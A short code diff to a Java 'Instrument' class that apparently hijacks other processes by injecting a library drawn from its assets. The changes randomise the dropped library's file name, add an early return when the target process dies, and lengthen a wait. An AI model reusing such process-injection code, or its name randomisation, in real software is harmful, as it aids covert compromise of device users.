@@ -36,7 +36,7 @@ public class Instrument {
 
 		hijacker = "m";
 		libInAsset = library;
-		lib_dest = "n"+libInAsset.hashCode();
+		lib_dest = String.valueOf(Math.abs((int)Utils.getRandom()));
 		path = filesPath.getAbsolutePath();
 		dumpPath = dump;
 		pidFile = _pidFile;
@@ -181,6 +181,7 @@ public class Instrument {
 							if (Cfg.DEBUG) {
 								Check.log(TAG + " (_startInstrumentation) Error: "+proc+" was killed");
 							}
+							return false;
 						}
 
 						File d = new File(getInstrumentationSuccessDir());
@@ -210,7 +211,7 @@ public class Instrument {
 								if (Cfg.DEBUG) {
 									Check.log(TAG + " (_startInstrumentation) sleep 5 secs "+proc);
 								}
-								Utils.sleep(2000);
+								Utils.sleep(5000);
 							}
 						}
 
